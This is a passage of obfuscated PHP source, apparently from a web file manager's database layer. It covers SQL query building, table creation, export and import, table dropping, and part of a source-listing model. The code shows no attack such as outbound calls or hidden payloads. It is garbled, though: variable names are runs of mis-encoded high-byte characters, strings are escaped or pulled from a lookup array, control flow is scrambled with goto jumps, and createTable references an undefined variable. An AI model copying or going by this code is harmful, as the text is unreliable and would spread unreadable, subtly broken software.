$this->parseComment(!empty($cŠÔàáÜå¯[$Cø»’ö’ĞŠ[337]]) ? $cŠÔàáÜå¯[$Cø»’ö’ĞŠ[337]] : $Cø»’ö’ĞŠ[33]); return $this->execute($D…øÖÈ£˜¡, $this->parseBind(!empty($cŠÔàáÜå¯[$Cø»’ö’ĞŠ[269]]) ? $cŠÔàáÜå¯[$Cø»’ö’ĞŠ[269]] : array())); } public function delete($C¾®½Û”ùë = array()) { $FéƒÈÎ“Ìö =& $_SERVER[Ö¹ñÒÁ²÷]; $this->model = $C¾®½Û”ùë[$FéƒÈÎ“Ìö[265]]; $d Úëö–Œù = $FéƒÈÎ“Ìö[951] . $this->parseTable($C¾®½Û”ùë[$FéƒÈÎ“Ìö[263]]) . $this->parseWhere(!empty($C¾®½Û”ùë[$FéƒÈÎ“Ìö[259]]) ? $C¾®½Û”ùë[$FéƒÈÎ“Ìö[259]] : $FéƒÈÎ“Ìö[33]) . $this->parseOrder(!empty($C¾®½Û”ùë[$FéƒÈÎ“Ìö[346]]) ? $C¾®½Û”ùë[$FéƒÈÎ“Ìö[346]] : $FéƒÈÎ“Ìö[33]) . $this->parseLimit(!empty($C¾®½Û”ùë[$FéƒÈÎ“Ìö[276]]) ? $C¾®½Û”ùë[$FéƒÈÎ“Ìö[276]] : $FéƒÈÎ“Ìö[33]) . $this->parseLock(isset($C¾®½Û”ùë[$FéƒÈÎ“Ìö[767]]) ? $C¾®½Û”ùë[$FéƒÈÎ“Ìö[767]] : !1) . $this->parseComment(!empty($C¾®½Û”ùë[$FéƒÈÎ“Ìö[337]]) ? $C¾®½Û”ùë[$FéƒÈÎ“Ìö[337]] : $FéƒÈÎ“Ìö[33]); return $this->execute($d Úëö–Œù, $this->parseBind(!empty($C¾®½Û”ùë[$FéƒÈÎ“Ìö[269]]) ? $C¾®½Û”ùë[$FéƒÈÎ“Ìö[269]] : array())); } public function select($f¡Æ³Úæ¯ = array()) { goto AŞì´í¢¼Â; AŞì´í¢¼Â: $F‰á²ªèÀ¬ =& $_SERVER[Ö¹ñÒÁ²÷]; $this->model = $f¡Æ³Úæ¯[$F‰á²ªèÀ¬[265]]; $AœµĞ§ÀŒ½ = $this->buildSelectSql($f¡Æ³Úæ¯); goto cÇÂèŠã˜…; cÇÂèŠã˜…: $A½«ô£â¢† = isset($f¡Æ³Úæ¯[$F‰á²ªèÀ¬[333]]) ? $f¡Æ³Úæ¯[$F‰á²ªèÀ¬[333]] : !1; if ($A½«ô£â¢†) { $Aï¥Ğ±ê‡˜ = is_string($A½«ô£â¢†[$F‰á²ªèÀ¬[89]]) ? $A½«ô£â¢†[$F‰á²ªèÀ¬[89]] : $F‰á²ªèÀ¬[952] . md5($AœµĞ§ÀŒ½); $d‰À‹ê¢· = think_cache($Aï¥Ğ±ê‡˜, $F‰á²ªèÀ¬[33], $A½«ô£â¢†); if (!1 !== $d‰À‹ê¢·) { return $d‰À‹ê¢·; } } $dÕÒÚáĞÇï = $this->query($AœµĞ§ÀŒ½, $this->parseBind(!empty($f¡Æ³Úæ¯[$F‰á²ªèÀ¬[269]]) ? $f¡Æ³Úæ¯[$F‰á²ªèÀ¬[269]] : array())); goto d›Ë¨Â¢¹; d›Ë¨Â¢¹: if ($A½«ô£â¢† && !1 !== $dÕÒÚáĞÇï) { think_cache($Aï¥Ğ±ê‡˜, $dÕÒÚáĞÇï, $A½«ô£â¢†); } return $dÕÒÚáĞÇï; goto E§Û‹Š½ì; E§Û‹Š½ì: } public function buildSelectSql($BĞÕè„‡¤ = array()) { goto d–¬¿ÊÔÜ; cÅøßèŒï—: return $b¼Æ…¨Ö³; goto EƒÀ¦ä¬Ó§; d–¬¿ÊÔÜ: $BØÒ³³ ¦· =& $_SERVER[Ö¹ñÒÁ²÷]; if (isset($BĞÕè„‡¤[$BØÒ³³ ¦·[336]])) { if (strpos($BĞÕè„‡¤[$BØÒ³³ ¦·[336]], $BØÒ³³ ¦·[47])) { list($Aƒ‡÷ƒà†Å, $B¨®¤éÜØŸ) = explode($BØÒ³³ ¦·[47], $BĞÕè„‡¤[$BØÒ³³ ¦·[336]]); } else { $Aƒ‡÷ƒà†Å = $BĞÕè„‡¤[$BØÒ³³ ¦·[336]]; } $Aƒ‡÷ƒà†Å = $Aƒ‡÷ƒà†Å ? $Aƒ‡÷ƒà†Å : 1; $B¨®¤éÜØŸ = isset($B¨®¤éÜØŸ) ? $B¨®¤éÜØŸ : (is_numeric($BĞÕè„‡¤[$BØÒ³³ ¦·[276]]) ? $BĞÕè„‡¤[$BØÒ³³ ¦·[276]] : 20); $F•ÜÏÕŸ— = $B¨®¤éÜØŸ * ((int) $Aƒ‡÷ƒà†Å - 1); $BĞÕè„‡¤[$BØÒ³³ ¦·[276]] = $F•ÜÏÕŸ— . $BØÒ³³ ¦·[47] . $B¨®¤éÜØŸ; } if (think_config($BØÒ³³ ¦·[953])) { $b™‡ÎçÎï½ = $BØÒ³³ ¦·[954] . md5(serialize($BĞÕè„‡¤)); $CÈ’ñ§öøù = think_cache($b™‡ÎçÎï½); if ($CÈ’ñ§öøù) { return $CÈ’ñ§öøù; } } goto f‚Îöİ­ÕÃ; f‚Îöİ­ÕÃ: $b¼Æ…¨Ö³ = $this->parseSql($this->selectSql, $BĞÕè„‡¤); $b¼Æ…¨Ö³ .= $this->parseLock(isset($BĞÕè„‡¤[$BØÒ³³ ¦·[767]]) ? $BĞÕè„‡¤[$BØÒ³³ ¦·[767]] : !1); if (isset($b™‡ÎçÎï½)) { think_cache($b™‡ÎçÎï½, $b¼Æ…¨Ö³); } goto cÅøßèŒï—; EƒÀ¦ä¬Ó§: } public function parseSql($Aãåù£î, $AˆŠí’ôÍÏ = array()) { $f÷ìÌÙù‚ß =& $_SERVER[Ö¹ñÒÁ²÷]; $Aãåù£î = str_replace(array($f÷ìÌÙù‚ß[955], $f÷ìÌÙù‚ß[956], $f÷ìÌÙù‚ß[957], $f÷ìÌÙù‚ß[958], $f÷ìÌÙù‚ß[959], $f÷ìÌÙù‚ß[960], $f÷ìÌÙù‚ß[961], $f÷ìÌÙù‚ß[962], $f÷ìÌÙù‚ß[963], $f÷ìÌÙù‚ß[964], $f÷ìÌÙù‚ß[965]), array($this->parseTable("{$AˆŠí’ôÍÏ[$f÷ìÌÙù‚ß[263]]}"), $this->parseDistinct(isset($AˆŠí’ôÍÏ[$f÷ìÌÙù‚ß[966]]) ? $AˆŠí’ôÍÏ[$f÷ìÌÙù‚ß[966]] : !1), $this->parseField(!empty($AˆŠí’ôÍÏ[$f÷ìÌÙù‚ß[257]]) ? $AˆŠí’ôÍÏ[$f÷ìÌÙù‚ß[257]] : $f÷ìÌÙù‚ß[172]), $this->parseJoin(!empty($AˆŠí’ôÍÏ[$f÷ìÌÙù‚ß[266]]) ? $AˆŠí’ôÍÏ[$f÷ìÌÙù‚ß[266]] : $f÷ìÌÙù‚ß[33]), $this->parseWhere(!empty($AˆŠí’ôÍÏ[$f÷ìÌÙù‚ß[259]]) ? $AˆŠí’ôÍÏ[$f÷ìÌÙù‚ß[259]] : $f÷ìÌÙù‚ß[33]), $this->parseGroup(!empty($AˆŠí’ôÍÏ[$f÷ìÌÙù‚ß[967]]) ? $AˆŠí’ôÍÏ[$f÷ìÌÙù‚ß[967]] : $f÷ìÌÙù‚ß[33]), $this->parseHaving(!empty($AˆŠí’ôÍÏ[$f÷ìÌÙù‚ß[968]]) ? $AˆŠí’ôÍÏ[$f÷ìÌÙù‚ß[968]] : $f÷ìÌÙù‚ß[33]), $this->parseOrder(!empty($AˆŠí’ôÍÏ[$f÷ìÌÙù‚ß[346]]) ? $AˆŠí’ôÍÏ[$f÷ìÌÙù‚ß[346]] : $f÷ìÌÙù‚ß[33]), $this->parseLimit(!empty($AˆŠí’ôÍÏ[$f÷ìÌÙù‚ß[276]]) ? $AˆŠí’ôÍÏ[$f÷ìÌÙù‚ß[276]] : $f÷ìÌÙù‚ß[33]), $this->parseUnion(!empty($AˆŠí’ôÍÏ[$f÷ìÌÙù‚ß[331]]) ? $AˆŠí’ôÍÏ[$f÷ìÌÙù‚ß[331]] : $f÷ìÌÙù‚ß[33]), $this->parseComment(!empty($AˆŠí’ôÍÏ[$f÷ìÌÙù‚ß[337]]) ? $AˆŠí’ôÍÏ[$f÷ìÌÙù‚ß[337]] : $f÷ìÌÙù‚ß[33])), $Aãåù£î); return $Aãåù£î; } public function getLastSql($fó¬…ŞÍ¢ = '') { return $fó¬…ŞÍ¢ ? $this->modelSql[$fó¬…ŞÍ¢] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($e»¹—ĞÛƒ) { return addslashes($e»¹—ĞÛƒ); } public function setModel($CÖæ²Êª²¡) { $this->model = $CÖæ²Êª²¡; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($d—İË‘½çˆ, $Fñ˜‚©Šİ = '') { $this->database = $d—İË‘½çˆ; $this->type = $Fñ˜‚©Šİ; } public function model($Bîªñ´À…Ë = '') { return new ModelBase($Bîªñ´À…Ë, $_SERVER[Ö¹ñÒÁ²÷][33], $this->database); } public function db($E¾‰‹¯î = false) { goto DÒ¾’·‹Áø; e˜â’¢—“ˆ: $this->database = $C÷‹¾†Èõ—; $DÂ•ºîÉ·->execute("\x75\163\145\x20\140{$C†âô»ŞÅñ}\x60"); return $DÂ•ºîÉ·; goto c¦³ŠåÛñğ; bÓ˜“‘¸«‰: $this->database = $C÷‹¾†Èõ—; $DÂ•ºîÉ· = $this->model()->db(); $eêŞ¦ê›Ï = $DÂ•ºîÉ·->execute("\163\x68\157\167\x20\144\141\164\x61\142\141\163\x65\x73\40\154\x69\153\145\x20\47{$C†âô»ŞÅñ}\47"); goto f’êŒøŠÒ; cá„æ™‡¼: $C†âô»ŞÅñ = $C÷‹¾†Èõ—[$e‡‘­¯Øºƒ[230]]; $C÷‹¾†Èõ—[$e‡‘­¯Øºƒ[230]] = $e‡‘­¯Øºƒ[33]; if ($C÷‹¾†Èõ—[$e‡‘­¯Øºƒ[884]] == $e‡‘­¯Øºƒ[721]) { $FÆ¿Ö†²› = $C÷‹¾†Èõ—[$e‡‘­¯Øºƒ[883]]; $C÷‹¾†Èõ—[$e‡‘­¯Øºƒ[883]] = substr($FÆ¿Ö†²›, 0, strrpos($FÆ¿Ö†²›, $e‡‘­¯Øºƒ[969])); } goto bÓ˜“‘¸«‰; DÒ¾’·‹Áø: $e‡‘­¯Øºƒ =& $_SERVER[Ö¹ñÒÁ²÷]; $C÷‹¾†Èõ— = $this->database; if ($this->type == $e‡‘­¯Øºƒ[9] || !$E¾‰‹¯î) { return $this->model()->db(); } goto cá„æ™‡¼; f’êŒøŠÒ: if (!$eêŞ¦ê›Ï) { $DÂ•ºîÉ·->execute("\143\162\x65\141\x74\x65\x20\x64\141\164\141\142\141\x73\x65\x20\140{$C†âô»ŞÅñ}\140"); } $C÷‹¾†Èõ—[$e‡‘­¯Øºƒ[230]] = $C†âô»ŞÅñ; if ($C÷‹¾†Èõ—[$e‡‘­¯Øºƒ[884]] == $e‡‘­¯Øºƒ[721]) { $C÷‹¾†Èõ—[$e‡‘­¯Øºƒ[883]] .= $e‡‘­¯Øºƒ[969] . $C†âô»ŞÅñ; } goto e˜â’¢—“ˆ; c¦³ŠåÛñğ: } public function createTable($c¿–à£æ”Ï, $C„Š©Æ›Ú = null) { $a—’©ô‹´ë =& $_SERVER[Ö¹ñÒÁ²÷]; if (!IO::exist($c¿–à£æ”Ï)) { show_json(LNG($a—’©ô‹´ë[970]), !1); } $AãŞ…ºÕ¨„ = sqlSplit(IO::getContent($c¿–à£æ”Ï)); foreach ($AãŞ…ºÕ¨„ as $a±Ğ¢Ó¨¾·) { if ($C„Š©Æ›Ú) { $aÍÈ®‡œË¤ = stripos($a±Ğ¢Ó¨¾·, $a—’©ô‹´ë[971]) === 0; if ($aÍÈ®‡œË¤) { $C„Š©Æ›Ú->task[$a—’©ô‹´ë[972]] += 1; } } $this->model()->db()->execute($a±Ğ¢Ó¨¾·); if ($C„Š©Æ›Ú && $aÍÈ®‡œË¤) { $EµÛä›× = $a—’©ô‹´ë[973]; preg_match($EµÛä›×, $a±Ğ¢Ó¨¾·, $aòƒŸ±—ñÓ); $C„Š©Æ›Ú->task[$a—’©ô‹´ë[974]] = trim($fÚœÆÆİí‘[0], $a—’©ô‹´ë[820]); $C„Š©Æ›Ú->update(1); } } $this->taskToCache($C„Š©Æ›Ú); } public function insertTable($a¤Ì»÷ œÃ, $EÎ×ĞÓÎ¡Ğ = null) { $c«¼‹ãÜÌ =& $_SERVER[Ö¹ñÒÁ²÷]; foreach ($a¤Ì»÷ œÃ as $dÎƒ®öÉœ¥) { $b»åÀ„”… = basename($dÎƒ®öÉœ¥); $b»åÀ„”… = substr($b»åÀ„”…, 0, strrpos($b»åÀ„”…, $c«¼‹ãÜÌ[91])); if ($EÎ×ĞÓÎ¡Ğ) { $EÎ×ĞÓÎ¡Ğ->task[$c«¼‹ãÜÌ[974]] = $b»åÀ„”…; } if (get_filesize($dÎƒ®öÉœ¥) == 0) { continue; } $b‹àÔˆßÛ = $this->sqlToDb($dÎƒ®öÉœ¥, $EÎ×ĞÓÎ¡Ğ); if (!$b‹àÔˆßÛ) { show_json(LNG($c«¼‹ãÜÌ[975]) . "\x5b{$b»åÀ„”…}\x5d", !1); } } $this->taskToCache($EÎ×ĞÓÎ¡Ğ); } public function sqlFromDb($FÜØ¦ªÃËç, $eØóÔ²¶ƒ, $c§†ƒ‘¹Ÿ‚ = null, $E£Öï»‹áì = null) { goto e¥ËùÑôĞÜ; EÇËº–ÚíŠ: $Aì÷ƒˆØØ° = $c‰ĞÙğ¸->getPk(); $bŞìé‰ì = $c‰ĞÙğ¸->getDbFields(); do { $CïÅ•´òÀò = $c‰ĞÙğ¸->field($bŞìé‰ì)->order($Aì÷ƒˆØØ° . $_SERVER[Ö¹ñÒÁ²÷][977])->selectPage($B¶¾£§È½ğ, $BğÁÙß’ß¡); $aáÂõ˜ç›ë = !empty($CïÅ•´òÀò[$_SERVER[Ö¹ñÒÁ²÷][350]]) ? $CïÅ•´òÀò[$_SERVER[Ö¹ñÒÁ²÷][350]] : array(); if (!($c‚Ä ‰ã¸ä = count($aáÂõ˜ç›ë))) { break; } if ($c§†ƒ‘¹Ÿ‚) { $c§†ƒ‘¹Ÿ‚->task[$_SERVER[Ö¹ñÒÁ²÷][972]] += $c‚Ä ‰ã¸ä; } $a¦»´‹•ââ = array(); foreach ($aáÂõ˜ç›ë as $Dö›Úé¸ë‹) { if ($E£Öï»‹áì) { $Dö›Úé¸ë‹[$_SERVER[Ö¹ñÒÁ²÷][75]] = "\173\x69\x6f\72{$E£Öï»‹áì}\x7d" . substr($Dö›Úé¸ë‹[$_SERVER[Ö¹ñÒÁ²÷][75]], strlen("\x7b\151\x6f\72{$Dö›Úé¸ë‹[$_SERVER[Ö¹ñÒÁ²÷][740]]}\x7d")); $Dö›Úé¸ë‹[$_SERVER[Ö¹ñÒÁ²÷][740]] = $E£Öï»‹áì; } $a¦»´‹•ââ[] = $_SERVER[Ö¹ñÒÁ²÷][978] . $this->sqlEncode($Dö›Úé¸ë‹) . $_SERVER[Ö¹ñÒÁ²÷][979]; } $f‘ñœ†ò÷Œ = "\x49\x4e\123\105\122\x54\40\111\x4e\124\117\x20\x60{$FÜØ¦ªÃËç}\140\x20\50\140" . implode($_SERVER[Ö¹ñÒÁ²÷][980], $bŞìé‰ì) . $_SERVER[Ö¹ñÒÁ²÷][981]; fwrite($D œ­„‘Ü©, $f‘ñœ†ò÷Œ . implode($_SERVER[Ö¹ñÒÁ²÷][982], $a¦»´‹•ââ) . $_SERVER[Ö¹ñÒÁ²÷][67] . PHP_EOL); $BğÁÙß’ß¡++; $AïµîÚØ«® += $c‚Ä ‰ã¸ä; if ($c§†ƒ‘¹Ÿ‚) { $c§†ƒ‘¹Ÿ‚->update($c‚Ä ‰ã¸ä); } } while ($c‚Ä ‰ã¸ä == $B¶¾£§È½ğ); goto e£Í¬±„Îí; e£Í¬±„Îí: fclose($D œ­„‘Ü©); return $AïµîÚØ«®; goto E´¦²Øˆ¦ª; e¥ËùÑôĞÜ: if ($c§†ƒ‘¹Ÿ‚) { $c§†ƒ‘¹Ÿ‚->task[$_SERVER[Ö¹ñÒÁ²÷][974]] = $FÜØ¦ªÃËç; } $c‰ĞÙğ¸ = $this->model($FÜØ¦ªÃËç); $AïµîÚØ«® = 0; goto A•åŒ¢ò…; A•åŒ¢ò…: $BğÁÙß’ß¡ = 1; $B¶¾£§È½ğ = 500; $D œ­„‘Ü© = fopen($eØóÔ²¶ƒ, $_SERVER[Ö¹ñÒÁ²÷][976]); goto EÇËº–ÚíŠ; E´¦²Øˆ¦ª: } public function sqlToDb($F‡ïœ• ŞÎ, $cØ¬ÁåÜ½ß = null) { goto DªÜ¾‰Íâ; bé³˜‘ …Š: if (!$d¤ì»Ñ¯®¼) { return !1; } $Aµ‘Ğ“¬Ïª = 0; $AÑçŠ×Å«“ = $eÔß‹“ã«Ù[33]; goto a­¶Êã„Ô•; a­¶Êã„Ô•: $BøŞ‘ÊÖ°à = 500 + 1; while (!feof($d¤ì»Ñ¯®¼)) { if ($cØ¬ÁåÜ½ß && $Aµ‘Ğ“¬Ïª != 0) { $cØ¬ÁåÜ½ß->task[$eÔß‹“ã«Ù[972]] += 1; } $Aµ‘Ğ“¬Ïª++; $F‹¥ÍŒ†óø = trim(fgets($d¤ì»Ñ¯®¼)); $AÑçŠ×Å«“ .= $eÔß‹“ã«Ù[50] . $this->sqlDecode($F‹¥ÍŒ†óø, $this->type); if ($Aµ‘Ğ“¬Ïª == $BøŞ‘ÊÖ°à) { $AÑçŠ×Å«“ = rtrim(trim($AÑçŠ×Å«“), $eÔß‹“ã«Ù[67]); if (!$B×¸·—ºâé->execute($AÑçŠ×Å«“)) { return !1; } if ($cØ¬ÁåÜ½ß) { $cØ¬ÁåÜ½ß->update($Aµ‘Ğ“¬Ïª - 1); } $AÑçŠ×Å«“ = $eÔß‹“ã«Ù[33]; $Aµ‘Ğ“¬Ïª = 0; } } fclose($d¤ì»Ñ¯®¼); goto aåçÉ‰Ò¨; DªÜ¾‰Íâ: $eÔß‹“ã«Ù =& $_SERVER[Ö¹ñÒÁ²÷]; $B×¸·—ºâé = $this->model()->db(); $d¤ì»Ñ¯®¼ = @fopen($F‡ïœ• ŞÎ, $eÔß‹“ã«Ù[983]); goto bé³˜‘ …Š; aåçÉ‰Ò¨: if ($AÑçŠ×Å«“) { $AÑçŠ×Å«“ = rtrim(trim($AÑçŠ×Å«“), $eÔß‹“ã«Ù[67]); if (!$B×¸·—ºâé->execute($AÑçŠ×Å«“)) { return !1; } if ($cØ¬ÁåÜ½ß) { $cØ¬ÁåÜ½ß->update($Aµ‘Ğ“¬Ïª - 1); } } return !0; goto B¬Ş÷–½Ì; B¬Ş÷–½Ì: } public function dropTable($fÍˆ¯Î‡ = null) { $aÅÙÓĞÙˆæ = $this->model()->db(); $a ˆ«øìÓÙ = $fÍˆ¯Î‡ ? array($fÍˆ¯Î‡) : $aÅÙÓĞÙˆæ->getTables(); if (!$a ˆ«øìÓÙ) { return; } foreach ($a ˆ«øìÓÙ as $fÍˆ¯Î‡) { $aÅÙÓĞÙˆæ->execute("\x64\162\157\x70\40\164\x61\x62\154\x65\40\x69\x66\40\145\170\151\163\164\163\40\140{$fÍˆ¯Î‡}\140"); } } private function taskToCache($fÚĞíÁ²š = null) { $EÙö²–ñÌŒ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$fÚĞíÁ²š) { return; } $c„‡´®Ö´ = array($EÙö²–ñÌŒ[974] => $fÚĞíÁ²š->task[$EÙö²–ñÌŒ[974]], $EÙö²–ñÌŒ[972] => $fÚĞíÁ²š->task[$EÙö²–ñÌŒ[972]], $EÙö²–ñÌŒ[984] => $fÚĞíÁ²š->task[$EÙö²–ñÌŒ[984]]); if ($c„‡´®Ö´[$EÙö²–ñÌŒ[972]] == $c„‡´®Ö´[$EÙö²–ñÌŒ[984]]) { $c„‡´®Ö´[$EÙö²–ñÌŒ[693]] = 1; } Cache::set($EÙö²–ñÌŒ[985] . $fÚĞíÁ²š->task[$EÙö²–ñÌŒ[363]], $c„‡´®Ö´); $fÚĞíÁ²š->end(); } private function sqlEncode($DŠÏâĞªßù) { $a¿ÂíêÜŠ =& $_SERVER[Ö¹ñÒÁ²÷]; $CÊÁš¤²– = array(); foreach ($DŠÏâĞªßù as $CİÖ´’èï) { if (is_array($CİÖ´’èï)) { $CİÖ´’èï = json_encode_force($CİÖ´’èï); } $CİÖ´’èï = addslashes($CİÖ´’èï); $CİÖ´’èï = str_replace(array($a¿ÂíêÜŠ[986], $a¿ÂíêÜŠ[213]), array($a¿ÂíêÜŠ[987], $a¿ÂíêÜŠ[988]), $CİÖ´’èï); $CÊÁš¤²–[] = str_replace($a¿ÂíêÜŠ[55], $a¿ÂíêÜŠ[989], $CİÖ´’èï); } return $a¿ÂíêÜŠ[55] . implode($a¿ÂíêÜŠ[990], $CÊÁš¤²–) . $a¿ÂíêÜŠ[55]; } private function sqlDecode($fâİƒñïğ›, $fšÊÍ²ò‚µ) { $eĞ±Øè¾µê =& $_SERVER[Ö¹ñÒÁ²÷]; $fâİƒñïğ› = str_replace(array($eĞ±Øè¾µê[987], $eĞ±Øè¾µê[988]), array($eĞ±Øè¾µê[986], $eĞ±Øè¾µê[213]), $fâİƒñïğ›); if ($fšÊÍ²ò‚µ == $eĞ±Øè¾µê[9]) { $fâİƒñïğ› = stripslashes($fâİƒñïğ›); } return $fâİƒñïğ›; } } goto F‘³õÍÜî¸; C¹Ğ¿İó²ò: class SourceListModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\157\165\x72\143\x65"; protected $tableMeta = array("\164\141\x62\x6c\145\116\x61\x6d\145" => "\x69\x6f\x5f\x73\x6f\165\x72\x63\x65\x5f\x6d\145\x74\x61", "\155\x65\164\141\x46\151\145\154\144" => "\x73\x6f\165\162\x63\x65\x49\104"); protected $dataAuto = array(array("\155\157\x64\151\x66\x79\x54\151\155\145", "\x74\x69\x6d\145", "\x69\x6e\163\145\x72\x74", "\x66\x75\156\143\164\151\157\x6e"), array("\x63\162\x65\141\x74\x65\124\x69\155\x65", "\x74\151\x6d\x65", "\151\156\x73\145\x72\x74", "\146\x75\x6e\143\164\151\157\x6e"), array("\x76\x69\x65\x77\124\151\155\145", "\x74\151\155\x65", "\x69\156\163\145\x72\x74", "\x66\x75\156\143\164\151\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($D‰¯¡ãò——) { return $this->listSource(array($_SERVER[Ö¹ñÒÁ²÷][364] => $D‰¯¡ãò——)); } public function typeName($Dµ†ìšêã†) { static $c—Ê®–¨é˜ = array(self::TYPE_SYSTEM => "\163\171\x73\164\x65\x6d", self::TYPE_USER => "\x75\163\x65\162", self::TYPE_GROUP => "\147\x72\157\165\x70"); return $c—Ê®–¨é˜[$Dµ†ìšêã† . $_SERVER[Ö¹ñÒÁ²÷][33]]; } public function sourceListInfo($f‹øƒù›¹à, $CĞŠæÅÛØ = false) { goto fÁã¿Ô; fÁã¿Ô: $EÄ—å¬Å =& $_SERVER[Ö¹ñÒÁ²÷]; $f‹øƒù›¹à = $f‹øƒù›¹à ? $f‹øƒù›¹à : array(); $f‹øƒù›¹à = array_filter(array_unique($f‹øƒù›¹à)); goto Dæá¾á·µã; E‹Ä¾„Î‹: return array_to_keyvalue($dí™×½ï, $EÄ—å¬Å[365]); goto F¾— ™‰Š; Dæá¾á·µã: if (!$f‹øƒù›¹à) { return array(); } $dí™×½ï = $this->where(array($EÄ—å¬Å[365] => array($EÄ—å¬Å[7], $f‹øƒù›¹à)))->select(); $this->_listDataApply($dí™×½ï, $CĞŠæÅÛØ); goto E‹Ä¾„Î‹; F¾— ™‰Š: } public function pathInfoFilter($D¬‹ø¾å‰‰) { goto a¿¿±©”ŸÌ; fìñÙËˆ´†: $D¬‹ø¾å‰‰[$F­†ÏÒÅõ[367]] = $this->typeName($D¬‹ø¾å‰‰[$F­†ÏÒÅõ[367]]); if ($D¬‹ø¾å‰‰[$F­†ÏÒÅõ[366]] != 1) { $D¬‹ø¾å‰‰[$F­†ÏÒÅõ[156]] = $D¬‹ø¾å‰‰[$F­†ÏÒÅõ[368]]; unset($D¬‹ø¾å‰‰[$F­†ÏÒÅõ[368]]); } $F‡Ï½ë…²‘ = $F­†ÏÒÅõ[369]; goto aÄß…Ö¹œÄ; a¿¿±©”ŸÌ: $F­†ÏÒÅõ =& $_SERVER[Ö¹ñÒÁ²÷]; $D¬‹ø¾å‰‰[$F­†ÏÒÅõ[75]] = KodIO::make($D¬‹ø¾å‰‰[$F­†ÏÒÅõ[365]]); $D¬‹ø¾å‰‰[$F­†ÏÒÅõ[29]] = $D¬‹ø¾å‰‰[$F­†ÏÒÅõ[366]] == 1 ? $F­†ÏÒÅõ[76] : $F­†ÏÒÅõ[163]; goto fìñÙËˆ´†; eÍë…³ŒŞ: if (isset($D¬‹ø¾å‰‰[$F­†ÏÒÅõ[372]]) && $D¬‹ø¾å‰‰[$F­†ÏÒÅõ[372]][$F­†ÏÒÅõ[373]] == -1) { $EãÆßÑÒ = array_remove_value($EãÆßÑÒ, $F­†ÏÒÅõ[183]); $EãÆßÑÒ = array_remove_value($EãÆßÑÒ, $F­†ÏÒÅõ[106]); $EãÆßÑÒ = array_remove_value($EãÆßÑÒ, $F­†ÏÒÅõ[374]); $EãÆßÑÒ = array_remove_value($EãÆßÑÒ, $F­†ÏÒÅõ[375]); $EãÆßÑÒ = array_remove_value($EãÆßÑÒ, $F­†ÏÒÅõ[77]); $EãÆßÑÒ = array_remove_value($EãÆßÑÒ, $F­†ÏÒÅõ[376]); } $D¬‹ø¾å‰‰ = array_field_key($D¬‹ø¾å‰‰, $EãÆßÑÒ); return $D¬‹ø¾å‰‰; goto f´¦Â²¶¼; aÄß…Ö¹œÄ: $F‡Ï½ë…²‘ .= $F­†ÏÒÅõ[370]; $F‡Ï½ë…²‘ .= $F­†ÏÒÅõ[371]; $EãÆßÑÒ = explode($F­†ÏÒÅõ[47], $F‡Ï½ë…²‘); goto eÍë…³ŒŞ; f´¦Â²¶¼: } public function listUserFav() { goto D‹˜ñ‡î»Ç; D‹˜ñ‡î»Ç: $dÆÚÍÉÚÕà =& $_SERVER[Ö¹ñÒÁ²÷]; $Aœ‡ººİí¿ = Model($dÆÚÍÉÚÕà[377])->listData(); $B‚Ôİ‰ìÔ = array_filter_by_field($Aœ‡ººİí¿, $dÆÚÍÉÚÕà[29], $dÆÚÍÉÚÕà[378]); goto F‰ÖåÆ”á; F‰ÖåÆ”á: $B‚Ôİ‰ìÔ = array_to_keyvalue($B‚Ôİ‰ìÔ, $dÆÚÍÉÚÕà[33], $dÆÚÍÉÚÕà[75]); if ($B‚Ôİ‰ìÔ) { $F¿¼ÈĞ¾·¢ = $this->listSource(array($dÆÚÍÉÚÕà[379] => array($dÆÚÍÉÚÕà[380], $B‚Ôİ‰ìÔ))); } $F¿¼ÈĞ¾·¢ = array_to_keyvalue($F¿¼ÈĞ¾·¢[$dÆÚÍÉÚÕà[350]], $dÆÚÍÉÚÕà[365]); goto FëÛ¾‰ÌÏŒ; FëÛ¾‰ÌÏŒ: foreach ($Aœ‡ººİí¿ as &$EÁ¶«Éœ£Ã) { $EÁ¶«Éœ£Ã = array($dÆÚÍÉÚÕà[381] => $EÁ¶«Éœ£Ã[$dÆÚÍÉÚÕà[363]], $dÆÚÍÉÚÕà[382] => $EÁ¶«Éœ£Ã[$dÆÚÍÉÚÕà[28]], $dÆÚÍÉÚÕà[383] => $EÁ¶«Éœ£Ã[$dÆÚÍÉÚÕà[75]], $dÆÚÍÉÚÕà[384] => $EÁ¶«Éœ£Ã[$dÆÚÍÉÚÕà[29]], $dÆÚÍÉÚÕà[385] => $EÁ¶«Éœ£Ã[$dÆÚÍÉÚÕà[183]], $dÆÚÍÉÚÕà[386] => $EÁ¶«Éœ£Ã[$dÆÚÍÉÚÕà[106]]); if ($EÁ¶«Éœ£Ã[$dÆÚÍÉÚÕà[29]] == $dÆÚÍÉÚÕà[378] && $F¿¼ÈĞ¾·¢[$EÁ¶«Éœ£Ã[$dÆÚÍÉÚÕà[75]]]) { $EÁ¶«Éœ£Ã[$dÆÚÍÉÚÕà[387]] = $F¿¼ÈĞ¾·¢[$EÁ¶«Éœ£Ã[$dÆÚÍÉÚÕà[75]]]; } } return $Aœ‡ººİí¿; goto C²‘„Ï“×ó; C²‘„Ï“×ó: } public function listUserTag($C¦™ŸŠ¨¯â) { goto b¢Ì‹¡Ä†à; F¦ìº¦î¯´: $this->listUserTagClear($A£Ò’ÄÕ¤³, $bÛâøõÄ¦é, $C¦™ŸŠ¨¯â); return $bÛâøõÄ¦é; goto f¢º«õ‡Á; b¢Ì‹¡Ä†à: $eÀ¾ÊÄù¼Š =& $_SERVER[Ö¹ñÒÁ²÷]; $c¬‚ö¨âñğ = Model($eÀ¾ÊÄù¼Š[388])->listData(); $A£Ò’ÄÕ¤³ = array_filter_by_field($c¬‚ö¨âñğ, $eÀ¾ÊÄù¼Š[389], $C¦™ŸŠ¨¯â); goto eæ¥„“¦Ú; eæ¥„“¦Ú: $A£Ò’ÄÕ¤³ = array_to_keyvalue($A£Ò’ÄÕ¤³, $eÀ¾ÊÄù¼Š[33], $eÀ¾ÊÄù¼Š[75]); $bÛâøõÄ¦é = array(); if 